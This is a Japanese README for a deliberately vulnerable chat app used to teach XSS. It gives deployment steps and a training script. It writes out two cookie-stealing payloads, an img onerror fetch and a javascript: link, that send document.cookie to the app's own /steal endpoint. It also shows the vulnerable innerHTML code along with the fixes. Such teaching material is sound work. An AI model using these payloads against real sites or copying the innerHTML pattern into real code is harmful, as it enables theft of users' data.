# XSS 体験デモ チャットアプリ

> ⚠️ **このアプリは「意図的に脆弱」に作られた研修用の教材です。**
> XSS（クロスサイトスクリプティング）の怖さを体感するためのものです。
> **本番環境・インターネット公開サーバーでは絶対に使わないでください。**
> 研修用のローカル環境、または使い捨ての一時環境でのみ使用してください。

チャットアプリを題材に、「**自分は普通に使っているだけなのに被害にあう**」という
XSS の本質を参加者に体感してもらうためのデモアプリです。

---

## このデモで伝えたいこと

- XSS は「攻撃された本人が悪いことをした」わけではない
- いつものサイトを**普通に使っているだけ**で、個人情報が盗まれる
- 「見ただけ」で被害にあうケース（格納型）と、「クリックして」被害にあうケースがある

---

## ローカルで起動する

```bash
npm install
npm start
```

起動すると、コンソールに以下が表示されます。

- **参加ページの URL**（`http://localhost:3000` と LAN 用 IP）
- **講師用ダッシュボードの URL**（`/stolen`）
- **コピペ用の攻撃コード 2 種**

ローカル（および Render / Railway / Fly.io などの常駐サーバー）では、
環境変数を何も設定しなければ **インメモリ** でデータを保持します
（プロセスを再起動すると全部リセット）。同じ LAN の参加者にはコンソールに出る
`http://<LAN IP>:3000` を共有すれば参加できます。

---

## Vercel にデプロイする

Vercel は **サーバーレス（関数型）** のため、インメモリではインスタンス間で
状態が共有されません（チャット履歴・盗まれた情報が消える/バラつく）。
そこで **Supabase（ホスト型 Postgres）を共有ストレージ**として使います。

> 環境変数 `SUPABASE_URL` と `SUPABASE_SERVICE_KEY` が両方セットされていれば
> 自動で Supabase を使い、なければインメモリにフォールバックします
> （`store.js`）。コードの切り替え作業は不要です。

### 手順

**1. Supabase プロジェクトを作る**
- [supabase.com](https://supabase.com) で新規プロジェクトを作成（無料枠で OK）。
- 左メニュー **SQL Editor** を開き、このリポジトリの [`supabase.sql`](./supabase.sql)
  の内容を貼り付けて **Run**。`messages` と `stolen` の 2 テーブルが作られます。

**2. 接続情報を 2 つ控える**
- 左下 **Project Settings → API** を開く。
  - **Project URL** … `https://xxxxxxxx.supabase.co` → これが `SUPABASE_URL`
  - **Project API keys → `service_role`（secret）** → これが `SUPABASE_SERVICE_KEY`
  - ⚠️ `service_role` キーはサーバー側専用の秘密鍵です。クライアントに埋め込まないでください
    （このアプリはサーバー側＝Vercel の関数内でのみ使用します）。

**3. Vercel にデプロイする**
- Vercel ダッシュボードで **Add New → Project** からこの GitHub リポジトリを Import。
- フレームワークは **Other**（自動検出のままで可）。ビルド設定はデフォルトでよい
  （`vercel.json` が全リクエストを `api/` のサーバーレス関数にルーティングします）。
- **Environment Variables** に以下を追加:

  | Name | Value |
  |---|---|
  | `SUPABASE_URL` | 手順2の Project URL |
  | `SUPABASE_SERVICE_KEY` | 手順2の `service_role` キー |

- **Deploy** を押す。完了したら発行された URL（例 `https://your-app.vercel.app`）が参加ページです。
  - 講師用ダッシュボードは `https://your-app.vercel.app/stolen`。

> Vercel CLI を使う場合は、リポジトリのルートで `vercel` → `vercel env add SUPABASE_URL`
> → `vercel env add SUPABASE_SERVICE_KEY` → `vercel --prod` でも同じことができます。

### 研修後の後始末
- データ（チャット・盗まれた情報）は Supabase に**残り続けます**。
  講師用画面の「リセット」ボタンで `stolen` は消せます。
  チャットも含めて全消去したい場合は、Supabase の SQL Editor で
  `truncate public.messages, public.stolen;` を実行してください。
- ⚠️ **意図的に脆弱なアプリ**です。公開 URL を放置すると本物の攻撃に悪用され得ます。
  研修が終わったら **Vercel のデプロイを削除（または Supabase プロジェクトを停止）** してください。

---

## 研修の流れ

### 1. 準備
1. 講師がアプリを起動し、参加ページの URL を参加者に共有する。
2. 参加者は名前と「**絶対に漏洩してはいけない個人情報**」（架空のもので OK）を入力して参加する。
   - 画面には「入力情報はあなたのブラウザにのみ保存され、他人には見えません」と表示される（→ 後で裏切られる演出）。
3. 全員でいくつか普通のメッセージを送り、チャットが動くことを確認する。
4. 講師は別タブで `/stolen`（講師用ダッシュボード）を開いておく。件数は `0` のはず。

### 2. 攻撃1：見るだけで被害（格納型 XSS）
講師がチャットに次のメッセージを投稿する：

```
いい天気ですね！<img src=x onerror="fetch('/steal?data='+encodeURIComponent(document.cookie))">
```

- このメッセージを**画面に表示した全員**の Cookie（＝個人情報）が盗まれる。
- 参加者は**リンクを踏んでもいない**し、**何も操作していない**。ただチャットを見ていただけ。
- `/stolen` の件数が一気に増えるのを見せる。これが「格納型 XSS」の怖さ。

### 3. 攻撃2：リンクを踏んで被害（`javascript:` スキーム）
次に講師が一見お得そうなリンクを投稿する：

```
<a href="javascript:fetch('/steal?data='+encodeURIComponent(document.cookie))">🎁 アンケートに答えてギフト券をもらう</a>
```

- 今度は**クリックした人だけ**被害にあう。
- 「怪しいリンクは踏まない」が大事、という気づきにつなげる。

### 4. 種明かし
`/stolen` に並んだ「他人には見えないはずだった個人情報」を見せて締める。

---

## 種明かし：なぜ動くのか / どう直すのか

### なぜ動くのか（このアプリの脆弱性）

1. **メッセージ表示でエスケープしていない**
   `/chat` 画面では、受け取ったメッセージを `innerHTML` にそのまま埋め込んでいます。
   そのため `<img onerror=...>` や `<a href="javascript:...">` がただの文字列ではなく
   **HTML/スクリプトとして実行**されてしまいます。

   ```js
   // app.js（脆弱な実装）
   log.innerHTML = '<div class="bubble">' + m.body + '</div>';
   ```

2. **Cookie に `httpOnly` を付けていない**
   個人情報を入れた Cookie に `httpOnly` 属性がないため、
   `document.cookie` で JavaScript から読み取れてしまいます。
   攻撃者はこれを外部（`/steal`）へ送信します。

### どう直すのか（正しい実装）

1. **表示は `textContent` を使う（エスケープする）**
   ユーザー入力を HTML として解釈させないようにします。

   ```js
   // 安全な実装の例
   const who = document.createElement('div');
   who.textContent = m.name;        // innerHTML ではなく textContent
   const bubble = document.createElement('div');
   bubble.textContent = m.body;     // タグはただの文字として表示される
   ```

   テンプレートエンジンを使う場合は、自動エスケープを有効にする／
   サーバー側でも出力時にエスケープする（このアプリの `/stolen` 画面は
   `escapeHtml()` でエスケープしているため安全です）。

2. **Cookie に `HttpOnly` を付ける**
   セッション情報などを JavaScript から読めないようにします。

   ```
   Set-Cookie: userSecret=...; HttpOnly; Secure; SameSite=Lax
   ```

   ※ そもそも「絶対に漏洩してはいけない個人情報」を Cookie に平文で保存しないことも重要です。

3. その他の多層防御
   - **Content-Security-Policy (CSP)** ヘッダでインラインスクリプトや外部送信を制限する
   - 入力値のバリデーション／サニタイズ（DOMPurify など）

---

## ファイル構成

```
.
├── package.json   # deps: express, @supabase/supabase-js
├── app.js         # Express アプリ本体（参加・チャット・攻撃者サーバー役・講師用画面）
├── store.js       # ストレージ抽象化（Supabase / インメモリを自動切り替え）
├── server.js      # ローカル・常駐サーバー用の起動エントリ（listen する）
├── api/index.js   # Vercel サーバーレス関数のエントリ
├── vercel.json    # Vercel のルーティング設定
├── supabase.sql   # Supabase に貼り付けるテーブル定義
├── README.md      # このファイル
└── .gitignore
```

- **ローカル / 常駐サーバー**: 環境変数なし → インメモリ（再起動でリセット）。
- **Vercel**: `SUPABASE_URL` と `SUPABASE_SERVICE_KEY` をセット → Supabase に永続化。
  ストレージの切り替えは `store.js` が環境変数を見て自動で行います。
